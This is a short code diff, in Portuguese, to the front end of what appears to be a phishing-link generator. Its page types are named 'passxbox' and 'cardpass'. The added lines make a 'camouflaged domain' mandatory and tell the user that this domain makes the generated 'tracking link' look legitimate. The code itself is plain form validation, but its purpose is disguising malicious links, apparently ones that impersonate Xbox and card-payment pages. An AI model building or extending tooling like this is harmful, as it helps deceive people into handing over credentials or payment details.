@@ -697,6 +697,13 @@
             const usePassXbox = pageType === 'passxbox';
             const useCardPass = pageType === 'cardpass';
             const customDomain = document.getElementById('customDomain').value.trim();
+            
+            if (!customDomain) {
+                showAlert('⚠️ Por favor, preencha o domínio camuflado!\n\nExemplo: passxbox.com\n\nEste domínio aparecerá no link gerado para parecer legítimo.', 'error');
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<span>🚀</span> Gerar Link de Rastreamento';
+                return;
+            }
 
             try {
                 const response = await fetch('/api/create-link', {
